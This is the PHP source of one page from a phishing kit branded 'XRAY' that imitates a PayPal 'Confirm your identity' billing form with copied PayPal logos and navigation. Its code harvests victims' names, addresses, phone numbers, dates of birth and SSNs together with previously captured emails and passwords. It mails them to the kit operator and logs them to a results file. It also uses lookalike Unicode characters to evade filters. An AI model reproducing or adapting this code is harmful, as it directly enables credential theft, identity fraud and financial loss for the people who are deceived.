<?php

#______XRAY_______#
error_reporting(0);
session_start();
include("../../config/__config__.php");
include("../../config/function.php");
include("lang/". $_SESSION['_lang_'].".php");

$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['IP'] = $_SERVER["REMOTE_ADDR"];
$time = date('l jS \of F Y h:i:s A');

$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;

if(isset($_POST['fname'])){
$time = date('l jS \of F Y h:i:s A');
$_SESSION['_fname_'] = $_POST['fname'];
$_SESSION['_lname_'] = $_POST['lname'];
$_SESSION['_adds1_'] = $_POST['adds1'];
$_SESSION['_adds2_'] = $_POST['adds2'];
$_SESSION['_city_'] = $_POST['city'];
$_SESSION['_zip_'] = $_POST['zip'];
$_SESSION['_state_'] = $_POST['state'];
$_SESSION['_phone_'] = $_POST['phone'];
$_SESSION['_dob_month_'] = $_POST['dob_month'];
$_SESSION['_dob_day_'] = $_POST['dob_day'];
$_SESSION['_dob_year_'] = $_POST['dob_year'];
$_SESSION['_SSN_'] = $_POST['SSN'];

$subject  = "PayPal Billing - [ " . $_SESSION['IP']  . " - " . $_SESSION['cntname'] . " ] ";

$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: XRAY" . "\r\n";


$message = "

<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;'>

IP              =>   <font color='#3366FF'>".$_SESSION['_IP_']."</font><br />
TIME            =>   <font color='#3366FF'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#3366FF'>".$_SESSION['_browser_']."</font><br />
USER AGENT      =>   <font color='#3366FF'>".$_SERVER['HTTP_USER_AGENT']."</font><br />
EMAIL           =>   <font color='#3366FF'>".$_SESSION['_email_']."</font><br />
PASSWORD        =>   <font color='#3366FF'>".$_SESSION['_password_']."</font><br />

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

FIRST NAME:     =>   <font color='#3366FF'>".$_POST['fname']."</font><br />
LAST NAME       =>   <font color='#3366FF'>".$_POST['lname']."</font><br />
ADDRESS LINE 1  =>   <font color='#3366FF'>".$_POST['adds1']."</font><br />
ADDRESS LINE 2  =>   <font color='#3366FF'>".$_POST['adds2']."</font><br />
COUNTRY         =>   <font color='#3366FF'>".$_SESSION['cntname']."</font><br />
COUNTRY_CODE    =>   <font color='#3366FF'>".$_SESSION['cntcode']."</font><br />
CITY            =>   <font color='#3366FF'>".$_POST['city']."</font><br />
STATE           =>   <font color='#3366FF'>".$_POST['state']."</font><br />
ZIP             =>   <font color='#3366FF'>".$_POST['zip']."</font><br />
DATE OF BIRTH   =>   <font color='#3366FF'>".$_POST['dob_day']."-".$_POST['dob_month']."-".$_POST['dob_year']."</font><br />
EMAIL           =>   <font color='#3366FF'>".$_SESSION['_email_']."</font><br />
PHONE           =>   <font color='#3366FF'>".$_POST['phone']."</font><br />
LAST 4 SSN      =>   <font color='#3366FF'>".$_POST['SSN']."</font><br />
___________________________________________________________________
<br />
||~~ BY ~~ XRAY ~~||
<br />
</div>";
if($_txt == 1){
			$message_txt = "
			
__________________________________________________________________________________________________________

IP              =>   ".$_SESSION['_IP_']."
TIME            =>   ".date('l jS \of F Y h:i:s A')."
BROWSER         =>   ".$_SESSION['_browser_']."
USER AGENT      =>   ".$_SERVER['HTTP_USER_AGENT']."
EMAIL           =>   ".$_SESSION['_email_']."
PASSWORD        =>   ".$_SESSION['_password_']."
__________________________________________________________________________________________________________
FIRST NAME:     =>   ".$_POST['fname']."
LAST NAME       =>   ".$_POST['lname']."
ADDRESS LINE 1  =>   ".$_POST['adds1']."
ADDRESS LINE 2  =>   ".$_POST['adds2']."
COUNTRY         =>   ".$_SESSION['cntname']."
CITY            =>   ".$_SESSION['cntcode']."
STATE           =>   ".$_POST['state']."
ZIP             =>   ".$_POST['zip']."
DATE OF BIRTH   =>   ".$_POST['dob_day']."-".$_POST['dob_month']."-".$_POST['dob_year']."
EMAIL           =>   ".$_SESSION['_email_']."
PHONE           =>   ".$_POST['phone']."
LAST 4 SSN      =>   ".$_POST['SSN']
;
				$v = fopen("../../r3zult/billing.txt","a");
				fwrite($v,$message_txt);
				fclose($v);
				
}
		@mail($to,$subject,$message,$headers);
		header("Location: apply.php?".$_SESSION['_DIR_']);

}
$femail = $_SESSION['_email_'];
$femail = str_replace("gmail","gmaιl",$femail);
$femail = str_replace("hotmail","hοtmail",$femail);
$femail = str_replace("yahoo","yahοο",$femail);

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sending yοur informatiοn to ΡayΡal</title>
    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/main22.css">
    <link rel="stylesheet" href="css/xxray.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
	<script src="javascript/jquery.creditCardValiidator.js"></script>
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
</head>
<script type="text/javascript">
	$(function() {
		$("#valider").click(function(){
			valid = true;
			if ($("#fname").val() == "" ) {
				$("#fname").css("border-color","#ff3f3f");
				valid = false;
			}
			else if(!$("#fname").val().match(/^[a-zA-z ]+$/i)){
				$("#fname").css("border-color","#ff3f3f");
				valid = false;
			}
			else {
				$("#fname").css("border-color","#B3B3B3");
			}
			if ($("#lname").val() == "" ) {
				$("#lname").css("border-color","#ff3f3f");
				valid = false;
			}
			else if(!$("#lname").val().match(/^[a-zA-z ]+$/i)){
				$("#lname").css("border-color","#ff3f3f");
				valid = false;
			}
			else {
				$("#lname").css("border-color","#B3B3B3");
			}
			if ($("#dob_month").val() == "0" ) {
				$("#dob_month").css("border-color","#ff3f3f");
				valid = false;
			}
			else {
				$("#dob_month").css("border-color","#B3B3B3");
			}
			if ($("#dob_day").val() == "0" ) {
				$("#dob_day").css("border-color","#ff3f3f");
				valid = false;
			}
			else {
				$("#dob_day").css("border-color","#B3B3B3");
			}
			if ($("#dob_year").val() == "0" ) {
				$("#dob_year").css("border-color","#ff3f3f");
				valid = false;
			}
			else {
				$("#dob_year").css("border-color","#B3B3B3");
			}
			if ($("#adds1").val() == "" ) {
				$("#adds1").css("border-color","#ff3f3f");
				valid = false;
			}
			else if(!$("#adds1").val().match(/^[a-zA-Z0-9 ,.]+$/i)){
				$("#adds1").css("border-color","#ff3f3f");
				valid = false;
			}
			else {
				$("#adds1").css("border-color","#B3B3B3");
			}
			if ($("#cityv").val() == "" ) {
				$("#cityv").css("border-color","#ff3f3f");
				valid = false;
			}
			else if(!$("#cityv").val().match(/^[a-zA-Z0-9 ,.]+$/i)){
				$("#cityv").css("border-color","#ff3f3f");
				valid = false;
			}
			else {
				$("#cityv").css("border-color","#B3B3B3");
			}
			return valid;
		});
	});
</script>
<body>
<div class="navbar navbar-fixed-top header navbar-header noPrint js_globalNavView" id="header" role="banner" data-show-warning="" style="height:32px;">
<div class="navbar-inner"><div class="navBanner clearfix">
<a href="#navMenu" class="toggleMenu visible-leftnav pull-left nemo_mobileNavMenuToggle">Main Menu</a>
<div class="brand" style="
    padding-top: 10px;
"><a href="#"><img src="https://www.paypalobjects.com/webstatic/logo/logo_paypal_212x56.png" class="nemo_regularPpLogo" height="28" width="106"></a></div>
<div class="headerActions">
<ul class="navSecondary">
<li class="notifications js_notificationButtonView notifications_mobile nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="js_notifications-toggleTrigger alerts nemo_notificationsMobileTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications">Notifications<span class="notificationCount notificationLength-0">0</span></a></li></ul></div></div><nav id="navMenu" class="navMenu clearfix noPrint" role="navigation"><ul class="globalNav clearfix">
<li><a href="#" class="navLink active nemo_globalNavSummaryLink" name="Header_Summary" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkSummary"></span></span> <span class="navText">Summary</span></a></li><li><a href="#" class="navLink nemo_globalNavActivityLink" name="Header_Activity" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkActivity"></span></span> <span class="navText">Activity</span></a></li><li><a href="#" class="navLink nemo_globalNavTransferLink" name="Header_Send_Request" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkTransfer"></span></span> <span class="navText">Send and Request</span></a></li><li><a href="#" class="navLink nemo_globalNavWalletLink" name="Header_Wallet" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkWallet"></span></span> <span class="navText">Wallet</span></a></li><li><a href="#" class="navLink nemo_globalNavShopLink" target="_blank" name="Header_Shop" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkShop"></span></span> <span class="navText">Shopping</span></a></li></ul><ul class="navSecondary"><li class="notifications js_notificationButtonView notifications_desktop nemo_headerNotifications" data-autodisplay="false"><a href="#" class="js_notifications-toggleTrigger alerts nemo_notificationsDesktopTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications">Notifications<span class="notificationCount notificationLength-0">0</span></a></li><li><a href="#" class="navIcons linkSettings" name="settings" title="Profile" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link">Profile</a></li><li><a href="/gb/cgi-bin/webscr?cmd=_help" class="navIcons linkHelp visible-leftnav" name="help" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link">Help</a></li><li class="logout"><a href="#" class="vx_btn vx_btn-small vx_btn-secondary logout" name="Header_Logout" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link">Log Out</a></li></ul></nav></div></div>
<br>
<br>
<br>
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="    height: 0%;"><div class="col-sm-7 progressAndWelcome">
<div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="100" data-hide-percent-animation="true"><div id="js_outerCircle" class="outerCircle"><div class="half lessThan50"><div class="pie right" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div></div><div class="half greaterThan50 js_greaterThan50"><div class="pie left" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div></div></div>
<div id="js_innerCircle" class="innerCircle"><div class="profilePhotoTable">
<div id="js_profilePhotoView" class="profilePhotoContainer hasFileReader" name="EM_Photo_Start" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo="{}" data-wurfl="{}">
<span id="js_user_icon" class="profilePhotoIcon icon icon-profile-add-large" aria-hidden="true" data-hover-text="Add a photo"></span></a></div></div><div id="js_percentageContainer" class="percentageContainer nemo_percentageContainer"><div id="js_percentage" class="nemo_accountCompletionPercent fadeOut hide">100%</div></div>
</div></div><div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule " data-module-number="0">
<br>

<br>

<p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader">
Hello again  ! 

</p><p class="toggleProfileStatus">
<button id="js_engagementActionTrigger" class="link vx_small-text js_emTrigger nemo_engagementActionTrigger" aria-controls="js_emSlideDownContainer" name="EM_AcctSetup_Open" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="profileStatusText">Your profile is at 100%</span></button><span class="icon icon-small icon-arrow-down-small nemo_profileStatusDownArrow" aria-hidden="true"></span></p></div></div><div id="js_engagementActions" class="col-sm-5 engagementActions"><ul class="actionsContainer nemo_actionsContainer"><li class="actionItem"><a href="#" role="button" data-module-number="1" name="EM_SendMoney" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" class="vx_small-text selectModule nemo_transferSelect js_selectModule"><span class="icon icon-medium icon-send-money" aria-hidden="true"></span><span>Pay or send money</span></a></li><li class="actionItem"><a href="#" role="button" name="EM_Mpi" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="2" data-offer-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRYQtgX20JOABVVHUDXldOVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YVxkFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyY19kAjklBj11W11eVGEuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sJSIFIwsqBzERGQELGQlNHkRZU19zJAExNhwnByAtUm9.CwxZBHY6aQYtZRVTbFo1Wn9XZlNQUiVTXAdAQlsTCxgGHgknLAwsNVN0QSgsWzp5CFhZAnc5bAsqMUZTZA9mUH8ANVUJX3EBDkAPAxkCRBFQXF9nfVN0Ylh0R355Vm1wU1FaVQ&amp;cks=MTMyODZiMjQyNjczMjgxZDA3MzYzMDExM2JiNjI4YmU&amp;e=1.0" data-offer-click="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRYQtgX20JOABVVHUDXldOVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YVxkFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyY19kAjklBj11W11eVGEuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDYmTB4nLBkgPw82HyYnMC0xGgxQKi47Kl0KNAZBIV8jAS9bYlVcX3IRAA0NFx8VXBwJV1hiKA9xMl8gR30sXzh8UwsJVXNpbwVwYRIDZFloWn0FdwkDEiRFCAAQFFBGGhQIXg1kK1txNF4jQnArC2t8W15aX3M-PAMpbEZRNh4nGz8UOABVUHIFWV9IQ1tGHEJdU1ptcFJyYw&amp;cks=NzNiNTk0MDk5NzIxMGRiZGJlMTMyMmRiMWU2ODY3MDY&amp;e=1.0" data-banner-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRYQtgX20JOABVVHUDXldOVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YVxkFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyY1xkAjklBj11W11eVGEuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sKiIKPQYHBzFTSxIeAgQUEEZcXldkbwcuJQkwEzggC2R-XQgIUyRpOgN8MEQGYQEzDHlSYFNfXndRCVcYSV9GTlMAARoyOw8jOAp.QH4oCm0rWwtcUyJoOQZxNxBVYQlmX3NSNwBZB3oFWwVfBh4EXxwJV1hke158YF10QHh-X2B8UlBVUHU&amp;cks=NzYyZjE1ZmI1MzAxNjZkNTJiMzA4NDJkMjVhMjU2OTY&amp;e=1.0" class="vx_small-text js_selectModule js_mpiOffer selectModule nemo_mpiSelect"><span class="icon icon-medium icon-shopping-bag " aria-hidden="true"></span>Shop and save</a></li><li class="actionItem"><a href="#" role="button" name="EM_Mpi" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="3" data-offer-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRZw1hXG0JOABVVHUFWFZNVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YV1kFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyZF9kAjklBj11W11eU2EuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sJSIFIwsqBzERGQELGQlNHkRZU19zJAExNhwnByAtUm9.CwxZBHY6aQYtZRVTbFo1Wn9XZlNQUiVTXAdAQlsTCxgGHgknLAwsNVN0QSgsWzp5CFhZAnc5bAsqMUZTZA9mUH8ANVUJX3EBDkAPAxkCRBFQXF9nfVN0Ylh0R355Vm1wU1FaVQ&amp;cks=NTQxMmQ3Mjg2YWRmN2UyYTk3ZjBmOWRlZTU4N2Q3ZDA&amp;e=1.0" data-offer-click="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRZw1hXG0JOABVVHUFWFZNVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YV1kFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyZF9kAjklBj11W11eU2EuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDYmTB4nLBkgPw82HyYnMC0xGgxQKi47Kl0KNAZBIV8jAS9bYlVcX3IRAA0NFx8VXBwJV1hiKA9xMl8gR30sXzh8UwsJVXNpbwVwYRIDZFloWn0FdwkDEiRFCAAQFFBGGhQIXg1kK1txNF4jQnArC2t8W15aX3M-PAMpbEZRNh4nGz8UOABVUHIFWV9IQ1tGHEJdU1ptcFJyYw&amp;cks=MTFkMTQ2YTA3MjFkMWZlOWY5Mjg0ZjFlNjAwZjRmZjc&amp;e=1.0" data-banner-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRZw1hXG0JOABVVHUFWFZNVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YV1kFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyZFxkAjklBj11W11eU2EuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sKiIKPQYHBzFTSxIeAgQUEEZcXldkbwcuJQkwEzggC2R-XQgIUyRpOgN8MEQGYQEzDHlSYFNfXndRCVcYSV9GTlMAARoyOw8jOAp.QH4oCm0rWwtcUyJoOQZxNxBVYQlmX3NSNwBZB3oFWwVfBh4EXxwJV1hke158YF10QHh-X2B8UlBVUHU&amp;cks=MDk4MWM3MTZkOWY3ZGJhMmFjMjYzMjU2Njg3Njc5M2I&amp;e=1.0" class="vx_small-text js_selectModule js_mpiOffer selectModule nemo_mpiSelect"><span class="icon icon-medium icon-shield " aria-hidden="true"></span>Buyer Protection</a></li></ul></div></div></div>
<div class="wrapper">
	<div style="float: left;" id="acc">
	<form class="xxray_51" method="POST" action="">
        <h1>Cοnfirm yοur identity.</h1>
        <h5>Βilling Αddress:</h5>
                <br />
        <input id="fname" name="fname" class="inp" type="text" value="<?php if(isset($_SESSION['_fname_'])){ echo $_SESSION['_fname_'];} ?>" maxlength="15" class="xxray_input"  class="xxray_input"  placeholder="First Name" style="width:160px;" />
		<input id="lname" name="lname" class="inp" type="text" value="<?php if(isset($_SESSION['_lname_'])){ echo $_SESSION['_lname_'];} ?>" maxlength="15" class="xxray_input"  class="xxray_input"  placeholder="Last Name" style="width:146px;"/>
		<input id="adds1" name="adds1" class="inp" type="text" value="<?php if(isset($_SESSION['_adds1_'])){ echo $_SESSION['_adds1_'];} ?>" maxlength="40" class="xxray_input"  class="xxray_input"  placeholder="Address line 1" style="width:341px;" />
		<input id="adds2" class="inp" name ="adds2" type="text" value="<?php if(isset($_SESSION['_adds2_'])){ echo $_SESSION['_adds2_'];} ?>" maxlength="30" class="xxray_input"  class="xxray_input"  placeholder="Address line 2" style="width: 182px;" />
		<input id="cityv" name="city" class="inp" type="text" value="<?php if(isset($_SESSION['_city_'])){ echo $_SESSION['_city_'];} ?>" maxlength="15" class="xxray_input"  class="xxray_input"  placeholder="City" style="width:122px;"/>
		<select id="country" name="country" class="inp" type="text" value="<?php if(isset($_SESSION['cntname'])){ echo $_SESSION['cntname'];} ?>" class="xxray_input"  placeholder="Country" style="width:141px; padding-left:5px;">
<option  <?php if(!isset($_countryCode)) echo "selected"; ?> value="0"></option>
			<option <?php if($_countryCode=="AL") echo "selected"; ?> value="AL">Albania</option>
			<option <?php if($_countryCode=="DZ") echo "selected"; ?> value="DZ">Algeria</option>
			<option <?php if($_countryCode=="AD") echo "selected"; ?> value="AD">Andorra</option>
			<option <?php if($_countryCode=="AO") echo "selected"; ?> value="AO">Angola</option>
			<option <?php if($_countryCode=="AL") echo "selected"; ?>  value="AI">Anguilla</option>
			<option <?php if($_countryCode=="AG") echo "selected"; ?> value="AG">Antigua &amp; Barbuda</option>
			<option <?php if($_countryCode=="AR") echo "selected"; ?>  value="AR">Argentina</option>
			<option <?php if($_countryCode=="AM") echo "selected"; ?> value="AM">Armenia</option>
			<option <?php if($_countryCode=="AW") echo "selected"; ?> value="AW">Aruba</option>
			<option <?php if($_countryCode=="AU") echo "selected"; ?>  value="AU">Australia</option>
			<option <?php if($_countryCode=="AT") echo "selected"; ?> value="AT">Austria</option>
			<option <?php if($_countryCode=="AZ") echo "selected"; ?> value="AZ">Azerbaijan</option>
			<option <?php if($_countryCode=="BS") echo "selected"; ?> value="BS">Bahamas</option>
			<option <?php if($_countryCode=="BH") echo "selected"; ?> value="BH">Bahrain</option>
			<option <?php if($_countryCode=="BB") echo "selected"; ?> value="BB">Barbados</option>
			<option <?php if($_countryCode=="BY") echo "selected"; ?> value="BY">Belarus</option>
			<option <?php if($_countryCode=="BE") echo "selected"; ?> value="BE">Belgium</option>
			<option <?php if($_countryCode=="BZ") echo "selected"; ?> value="BZ">Belize</option>
			<option <?php if($_countryCode=="BJ") echo "selected"; ?> value="BJ">Benin</option>
			<option <?php if($_countryCode=="BM") echo "selected"; ?> value="BM">Bermuda</option>
			<option <?php if($_countryCode=="BT") echo "selected"; ?> value="BT">Bhutan</option>
			<option <?php if($_countryCode=="BO") echo "selected"; ?> value="BO">Bolivia</option>
			<option <?php if($_countryCode=="BA") echo "selected"; ?> value="BA">Bosnia &amp; Herzegovina</option>
			<option <?php if($_countryCode=="BW") echo "selected"; ?> value="BW">Botswana</option>
			<option <?php if($_countryCode=="BR") echo "selected"; ?> value="BR">Brazil</option>
			<option <?php if($_countryCode=="VG") echo "selected"; ?> value="VG">British Virgin Islands</option>
			<option <?php if($_countryCode=="BN") echo "selected"; ?> value="BN">Brunei</option>
			<option <?php if($_countryCode=="BG") echo "selected"; ?> value="BG">Bulgaria</option>
			<option <?php if($_countryCode=="BF") echo "selected"; ?> value="BF">Burkina Faso</option>
			<option <?php if($_countryCode=="BI") echo "selected"; ?>  value="BI">Burundi</option>
			<option <?php if($_countryCode=="KH") echo "selected"; ?> value="KH">Cambodia</option>
			<option <?php if($_countryCode=="CM") echo "selected"; ?> value="CM">Cameroon</option>
			<option <?php if($_countryCode=="CA") echo "selected"; ?> value="CA">Canada</option>
			<option <?php if($_countryCode=="CV") echo "selected"; ?> value="CV">Cape Verde</option>
			<option <?php if($_countryCode=="KY") echo "selected"; ?> value="KY">Cayman Islands</option>
			<option <?php if($_countryCode=="TD") echo "selected"; ?> value="TD">Chad</option>
			<option <?php if($_countryCode=="CL") echo "selected"; ?> value="CL">Chile</option>
			<option <?php if($_countryCode=="CN") echo "selected"; ?> value="CN">China</option>
			<option <?php if($_countryCode=="C2") echo "selected"; ?> value="C2">China</option>
			<option <?php if($_countryCode=="CO") echo "selected"; ?> value="CO">Colombia</option>
			<option <?php if($_countryCode=="KM") echo "selected"; ?> value="KM">Comoros</option>
			<option <?php if($_countryCode=="CG") echo "selected"; ?> value="CG">Congo &#x2D; Brazzaville</option>
			<option <?php if($_countryCode=="CD") echo "selected"; ?> value="CD">Congo &#x2D; Kinshasa</option>
			<option <?php if($_countryCode=="CK") echo "selected"; ?>  value="CK">Cook Islands</option>
			<option <?php if($_countryCode=="CR") echo "selected"; ?> value="CR">Costa Rica</option>
			<option <?php if($_countryCode=="CL") echo "selected"; ?> value="CI">Côte d’Ivoire</option>
			<option <?php if($_countryCode=="HR") echo "selected"; ?> value="HR">Croatia</option>
			<option <?php if($_countryCode=="CY") echo "selected"; ?> value="CY">Cyprus</option>
			<option <?php if($_countryCode=="CZ") echo "selected"; ?> value="CZ">Czech Republic</option>
			<option <?php if($_countryCode=="DK") echo "selected"; ?> value="DK">Denmark</option>
			<option <?php if($_countryCode=="DJ") echo "selected"; ?> value="DJ">Djibouti</option>
			<option <?php if($_countryCode=="DM") echo "selected"; ?> value="DM">Dominica</option>
			<option <?php if($_countryCode=="DO") echo "selected"; ?> value="DO">Dominican Republic</option>
			<option <?php if($_countryCode=="EC") echo "selected"; ?> value="EC">Ecuador</option>
			<option <?php if($_countryCode=="EG") echo "selected"; ?> value="EG">Egypt</option>
			<option <?php if($_countryCode=="SV") echo "selected"; ?> value="SV">El Salvador</option>
			<option <?php if($_countryCode=="ER") echo "selected"; ?> value="ER">Eritrea</option>
			<option <?php if($_countryCode=="EE") echo "selected"; ?> value="EE">Estonia</option>
			<option <?php if($_countryCode=="ET") echo "selected"; ?> value="ET">Ethiopia</option>
			<option <?php if($_countryCode=="FK") echo "selected"; ?> value="FK">Falkland Islands</option>
			<option <?php if($_countryCode=="FO") echo "selected"; ?> value="FO">Faroe Islands</option>
			<option <?php if($_countryCode=="FJ") echo "selected"; ?> value="FJ">Fiji</option>
			<option <?php if($_countryCode=="FI") echo "selected"; ?> value="FI">Finland</option>
			<option <?php if($_countryCode=="FR") echo "selected"; ?> value="FR">France</option>
			<option <?php if($_countryCode=="GF") echo "selected"; ?> value="GF">French Guiana</option>
			<option <?php if($_countryCode=="PF") echo "selected"; ?> value="PF">French Polynesia</option>
			<option <?php if($_countryCode=="GA") echo "selected"; ?> value="GA">Gabon</option>
			<option <?php if($_countryCode=="GM") echo "selected"; ?> value="GM">Gambia</option>
			<option <?php if($_countryCode=="GE") echo "selected"; ?> value="GE">Georgia</option>
			<option <?php if($_countryCode=="DE") echo "selected"; ?> value="DE">Germany</option>
			<option <?php if($_countryCode=="GI") echo "selected"; ?> value="GI">Gibraltar</option>
			<option <?php if($_countryCode=="GR") echo "selected"; ?> value="GR">Greece</option>
			<option  <?php if($_countryCode=="GL") echo "selected"; ?> value="GL">Greenland</option>
			<option  <?php if($_countryCode=="GD") echo "selected"; ?> value="GD">Grenada</option>
			<option  <?php if($_countryCode=="GP") echo "selected"; ?> value="GP">Guadeloupe</option>
			<option  <?php if($_countryCode=="GT") echo "selected"; ?> value="GT">Guatemala</option>
			<option  <?php if($_countryCode=="GN") echo "selected"; ?> value="GN">Guinea</option>
			<option  <?php if($_countryCode=="GW") echo "selected"; ?> value="GW">Guinea&#x2D;Bissau</option>
			<option  <?php if($_countryCode=="GY") echo "selected"; ?> value="GY">Guyana</option>
			<option  <?php if($_countryCode=="HN") echo "selected"; ?> value="HN">Honduras</option>
			<option  <?php if($_countryCode=="HK") echo "selected"; ?> value="HK">Hong Kong SAR China</option>
			<option  <?php if($_countryCode=="HU") echo "selected"; ?> value="HU">Hungary</option>
			<option  <?php if($_countryCode=="IS") echo "selected"; ?> value="IS">Iceland</option>
			<option  <?php if($_countryCode=="IN") echo "selected"; ?> value="IN">India</option>
			<option  <?php if($_countryCode=="ID") echo "selected"; ?> value="ID">Indonesia</option>
			<option  <?php if($_countryCode=="IE") echo "selected"; ?> value="IE">Ireland</option>
			<option  <?php if($_countryCode=="IL") echo "selected"; ?> value="IL">Israel</option>
			<option  <?php if($_countryCode=="IT") echo "selected"; ?> value="IT">Italy</option>
			<option  <?php if($_countryCode=="JM") echo "selected"; ?> value="JM">Jamaica</option>
			<option  <?php if($_countryCode=="JP") echo "selected"; ?> value="JP">Japan</option>
			<option  <?php if($_countryCode=="JO") echo "selected"; ?> value="JO">Jordan</option>
			<option  <?php if($_countryCode=="KZ") echo "selected"; ?> value="KZ">Kazakhstan</option>
			<option  <?php if($_countryCode=="KE") echo "selected"; ?> value="KE">Kenya</option>
